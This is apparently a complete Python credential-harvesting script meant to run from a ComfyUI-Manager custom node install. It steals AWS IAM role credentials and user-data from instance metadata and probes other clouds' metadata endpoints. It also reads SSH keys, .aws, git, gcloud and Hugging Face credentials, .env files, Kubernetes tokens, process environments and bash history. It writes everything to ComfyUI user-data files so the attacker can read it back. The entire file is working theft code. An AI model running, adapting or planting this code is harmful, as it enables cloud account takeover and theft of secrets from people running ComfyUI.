#!/usr/bin/env python3
# hk402 harvest: cloud identity + host inventory from a ComfyUI-Manager custom node install.
import os, sys, glob, json, time, base64, hashlib, subprocess, urllib.request, urllib.error

TAG = "hk402"
H = {}
L = []


def log(k, v):
    H[k] = v
    L.append(k)
    print("[%s] %s" % (TAG, k), flush=True)


def sh(cmd, t=12):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return ((p.stdout or "") + (p.stderr or ""))[:8000]
    except Exception as e:
        return "ERR %r" % e


def http(url, hdrs=None, t=3, method="GET", data=None, limit=40000):
    try:
        req = urllib.request.Request(url, headers=hdrs or {}, method=method, data=data)
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read(limit).decode("utf8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(2000).decode("utf8", "replace")
        except Exception:
            return e.code, ""
    except Exception as e:
        return -1, repr(e)


def sysinfo():
    d = {}
    for k, c in [("hostname", "hostname"), ("id", "id"), ("uname", "uname -a"),
                 ("nproc", "nproc"), ("os", "cat /etc/os-release 2>/dev/null | head -8"),
                 ("cgroup", "cat /proc/1/cgroup 2>/dev/null | head -5"),
                 ("dockerenv", "ls -la /.dockerenv 2>/dev/null; echo"),
                 ("ip", "ip -4 a 2>/dev/null; echo '---'; ip route 2>/dev/null"),
                 ("hosts", "cat /etc/hosts 2>/dev/null"),
                 ("dns", "cat /etc/resolv.conf 2>/dev/null"),
                 ("machineid", "cat /etc/machine-id 2>/dev/null"),
                 ("mounts", "mount | grep -Ei 'nfs|cifs|9p|fuse' | head -10"),
                 ("lscpu", "lscpu 2>/dev/null | head -12"),
                 ("uptime", "uptime")]:
        d[k] = sh(c, 8)
    tok, body = http("https://api.ipify.org", t=4, limit=200)
    d["egress_ip"] = body.strip() if tok == 200 else "code=%s %s" % (tok, body[:120])
    log("sys", d)


def imds_aws():
    d = {}
    h2 = {}
    c, b = http("http://169.254.169.254/latest/api/token", t=2, method="PUT",
                hdrs={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
    d["token_code"] = c
    if c == 200 and b.strip():
        h2 = {"X-aws-ec2-metadata-token": b.strip()}
        d["imdsv2"] = True
    else:
        d["imdsv2"] = False
    for p in ["instance-id", "instance-type", "placement/region", "placement/availability-zone",
              "placement/availability-zone-id", "ami-id", "local-hostname", "public-ipv4",
              "iam/info", "identity-credentials/ec2/info", "network/interfaces/macs/",
              "services/domain", "spot/instance-action"]:
        c, b = http("http://169.254.169.254/latest/meta-data/" + p, hdrs=h2, t=2)
        d[p] = ("%s %s" % (c, b.strip()[:1200])) if c == 200 else "code=%s" % c
    c, b = http("http://169.254.169.254/latest/meta-data/iam/security-credentials/", hdrs=h2, t=2)
    d["role_list"] = ("%s %s" % (c, b.strip()[:400])) if c == 200 else "code=%s" % c
    roles = [x.strip() for x in b.splitlines() if x.strip()] if c == 200 else []
    d["roles"] = roles
    d["creds"] = {}
    for r in roles[:3]:
        c2, b2 = http("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + r, hdrs=h2, t=3)
        d["creds"][r] = ("%s %s" % (c2, b2)) if c2 == 200 else "code=%s" % c2
    c, b = http("http://169.254.169.254/latest/user-data", hdrs=h2, t=3, limit=8000)
    d["userdata"] = ("%s %s" % (c, b[:3000])) if c == 200 else "code=%s" % c
    log("imds_aws", d)


def cloud_probe():
    d = {}
    c, b = http("http://169.254.169.254/computeMetadata/v1/?recursive=true", t=2,
                hdrs={"Metadata-Flavor": "Google"}, limit=6000)
    d["gcp"] = "%s %s" % (c, b[:1500])
    c, b = http("http://169.254.169.254/metadata/instance?api-version=2021-02-01", t=2,
                hdrs={"Metadata": "true"}, limit=3000)
    d["azure"] = "%s %s" % (c, b[:1200])
    c, b = http("http://100.100.100.200/latest/meta-data/ram/security-credentials/", t=2, limit=2000)
    d["alibaba"] = "%s %s" % (c, b[:800])
    c, b = http("http://metadata.tencentyun.com/latest/meta-data/instance-id", t=2, limit=500)
    d["tencent"] = "%s %s" % (c, b[:300])
    c, b = http("http://169.254.169.254/metadata/v1/id", t=2, limit=500)
    d["digitalocean"] = "%s %s" % (c, b[:300])
    log("cloud_probe", d)


def creds_files():
    d = {}
    paths = ["/root/.aws/credentials", "/root/.aws/config", "/root/.aws/sso/cache",
             "/root/.aws/cli/cache", "/root/.git-credentials", "/root/.netrc",
             "/root/.config/gcloud/application_default_credentials.json",
             "/root/.config/rclone/rclone.conf", "/root/.config/huggingface/token",
             "/root/.cache/huggingface/token", "/etc/environment",
             "/ComfyUI/.env", "/ComfyUI/extra_model_paths.yaml"]
    for pat in ["/home/*/.aws/credentials", "/home/*/.aws/config", "/home/*/.git-credentials",
                "/home/*/.config/gcloud/application_default_credentials.json",
                "/opt/*/.env", "/opt/*/*/.env", "/root/*/.env", "/workspace/*/.env",
                "/app/*/.env", "/data/*/.env", "/ComfyUI/*.env", "/ComfyUI/user/*.env"]:
        paths += glob.glob(pat)
    for p in paths:
        try:
            if os.path.isdir(p):
                d[p] = "DIR " + ",".join(os.listdir(p)[:20])
            elif os.path.isfile(p):
                with open(p, "r", errors="replace") as f:
                    d[p] = f.read(4000)
        except Exception as e:
            d[p] = "ERR %r" % e
    envdump = {}
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            cmd = open("/proc/%s/cmdline" % pid, "rb").read().replace(b"\0", b" ").decode("utf8", "replace")
            if ("ComfyUI" in cmd or "python" in cmd) and "hk402" not in cmd:
                raw = open("/proc/%s/environ" % pid, "rb").read()
                envdump[pid] = {"cmd": cmd[:300],
                                "env": dict(x.split("=", 1) for x in raw.split(b"\0") if b"=" in x)
                                if len(raw) < 40000 else raw[:8000].decode("utf8", "replace")}
                break
        except Exception:
            pass
    d["_proc_env"] = envdump
    log("creds_files", d)


def ssh_material():
    d = {}
    for p in glob.glob("/root/.ssh/*") + glob.glob("/home/*/.ssh/*"):
        try:
            st = os.stat(p)
            if os.path.isfile(p) and st.st_size < 20000:
                with open(p, "r", errors="replace") as f:
                    d[p] = f.read(4000)
            else:
                d[p] = "size=%d" % st.st_size
        except Exception as e:
            d[p] = "ERR %r" % e
    d["_dirs"] = sh("ls -la /root/.ssh /home/*/.ssh 2>/dev/null", 5)
    log("ssh", d)


def docker_gpu():
    d = {}
    d["sock"] = sh("ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>&1", 5)
    d["ps"] = sh("docker ps -a --format '{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}|{{.Ports}}' 2>&1 | head -60", 10)
    d["images"] = sh("docker images --format '{{.Repository}}:{{.Tag}}|{{.ID}}|{{.Size}}' 2>&1 | head -40", 10)
    d["runtime"] = sh("docker info 2>/dev/null | grep -Ei 'runtime|nvidia|gpu' | head -10", 10)
    d["nvidia_smi"] = sh("nvidia-smi -L 2>&1", 10)
    d["nvidia_q"] = sh("nvidia-smi --query-gpu=index,name,uuid,memory.total,driver_version --format=csv,noheader 2>&1", 10)
    d["nvproc"] = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 10)
    d["drv"] = sh("cat /proc/driver/nvidia/version 2>&1", 5)
    d["dev"] = sh("ls -la /dev/nvidia* 2>&1 | head -10", 5)
    log("docker_gpu", d)


def k8s():
    d = {}
    d["sa_dir"] = sh("ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1", 5)
    for p in ["/var/run/secrets/kubernetes.io/serviceaccount/token",
              "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
              "/root/.kube/config", "/etc/kubernetes/kubelet.conf",
              "/etc/rancher/k3s/k3s.yaml"]:
        if os.path.isfile(p):
            try:
                d[p] = open(p, "r", errors="replace").read(6000)
            except Exception as e:
                d[p] = "ERR %r" % e
    d["env"] = sh("env | grep -Ei 'KUBERNETES|KUBE|CLUSTER|TENANT' | head -20", 5)
    log("k8s", d)


def comfy():
    d = {}
    roots = []
    for pat in ["/ComfyUI", "/work/ComfyUI", "/app/ComfyUI", "/opt/ComfyUI", "/root/ComfyUI",
                "/workspace/ComfyUI", "/home/*/ComfyUI", "/*/ComfyUI"]:
        roots += glob.glob(pat)
    d["roots"] = roots[:10]
    for r in roots[:3]:
        d[r + "/custom_nodes"] = sh("ls -la '%s/custom_nodes' 2>&1 | head -25" % r, 6)
        d[r + "/requirements.txt"] = sh("head -20 '%s/requirements.txt' 2>&1" % r, 5)
    d["manager_cfg"] = sh("find / -xdev -maxdepth 7 -name config.ini -path '*ComfyUI-Manager*' 2>/dev/null | head -3 | xargs -r -n1 sh -c 'echo \"== $0\"; cat \"$0\"' 2>&1 | head -60", 15)
    d["startup"] = sh("find / -xdev -maxdepth 8 -name install-scripts.txt -path '*startup-scripts*' 2>/dev/null | head -3 | xargs -r -n1 sh -c 'echo \"== $0\"; tail -5 \"$0\"' 2>&1 | head -40", 15)
    d["userdirs"] = sh("find / -xdev -maxdepth 6 -type d -name default -path '*ComfyUI/user*' 2>/dev/null | head -5", 15)
    log("comfy", d)


def misc():
    d = {}
    d["bash_hist"] = sh("tail -40 /root/.bash_history 2>/dev/null", 5)
    d["cloud_init"] = sh("ls -la /var/lib/cloud/ 2>/dev/null; head -40 /var/lib/cloud/instance/user-data.txt 2>/dev/null", 6)
    d["cron"] = sh("crontab -l 2>&1 | head -10; ls /etc/cron.d 2>/dev/null; systemctl list-units --type=service --state=running 2>/dev/null | head -10", 8)
    d["opt"] = sh("ls -la /opt /root /home /workspace /data 2>&1 | head -60", 6)
    d["tmp"] = sh("ls -la /tmp 2>&1 | head -20", 5)
    d["sshd"] = sh("grep -Ei '^(PasswordAuthentication|PermitRootLogin|PubkeyAuthentication)' /etc/ssh/sshd_config 2>/dev/null", 5)
    log("misc", d)


def main():
    t0 = time.time()
    H["_meta"] = {"tag": TAG, "ts": time.strftime("%FT%TZ", time.gmtime()), "uid": os.getuid(),
                  "cwd": os.getcwd(), "argv": sys.argv[:3], "py": sys.version.split()[0]}
    for fn in (sysinfo, imds_aws, cloud_probe, creds_files, ssh_material, docker_gpu, k8s, comfy, misc):
        try:
            fn()
        except Exception as e:
            H["_err_" + fn.__name__] = repr(e)
    H["_meta"]["elapsed"] = round(time.time() - t0, 1)
    blob = json.dumps(H, indent=1, default=str)
    # compact summary for quick readback
    aws = H.get("imds_aws", {})
    gp = H.get("docker_gpu", {})
    summary = {
        "meta": H["_meta"],
        "host": (H.get("sys", {}).get("hostname") or "").strip(),
        "id": (H.get("sys", {}).get("id") or "").strip(),
        "ip": (H.get("sys", {}).get("ip") or "").replace("\n", " ")[:160],
        "egress_ip": H.get("sys", {}).get("egress_ip"),
        "aws": {k: aws.get(k) for k in ("imdsv2", "instance-id", "instance-type", "placement/region",
                                        "placement/availability-zone", "iam/info", "role_list", "roles")},
        "gpu": {"smi": gp.get("nvidia_smi"), "q": gp.get("nvidia_q"), "drv": gp.get("drv")},
        "docker_ps": (gp.get("ps") or "")[:1500],
        "k8s_sa": (H.get("k8s", {}).get("sa_dir") or "")[:300],
        "comfy_roots": H.get("comfy", {}).get("roots"),
        "sizes": {"json": len(blob)},
    }
    sm = json.dumps(summary, indent=1, default=str)

    # candidate write locations (all under the ComfyUI user data dir so /userdata can read them back)
    dirs = []
    for pat in ["/ComfyUI/user/default", "/work/ComfyUI/user/default", "/app/ComfyUI/user/default",
                "/opt/ComfyUI/user/default", "/root/ComfyUI/user/default",
                "/workspace/ComfyUI/user/default", "/home/*/ComfyUI/user/default",
                "/data/ComfyUI/user/default", "/*/ComfyUI/user/default"]:
        dirs += glob.glob(pat)
    dirs.insert(0, os.path.abspath(os.path.join(os.getcwd(), "..", "..", "user", "default")))
    written = []
    for d in dirs:
        for sub in ("ComfyUI-Manager/cache", ""):
            p = os.path.join(d, sub) if sub else d
            try:
                os.makedirs(p, exist_ok=True)
                with open(os.path.join(p, TAG + "_harvest.json"), "w") as f:
                    f.write(blob)
                with open(os.path.join(p, TAG + "_sum.txt"), "w") as f:
                    f.write(sm)
                written.append(p)
            except Exception:
                pass
    try:
        with open("/tmp/" + TAG + "_harvest.json", "w") as f:
            f.write(blob)
        written.append("/tmp")
    except Exception:
        pass
    print("[%s] WRITTEN %s" % (TAG, written), flush=True)
    print("[%s] SUMMARY %s" % (TAG, sm[:3000]), flush=True)


main()
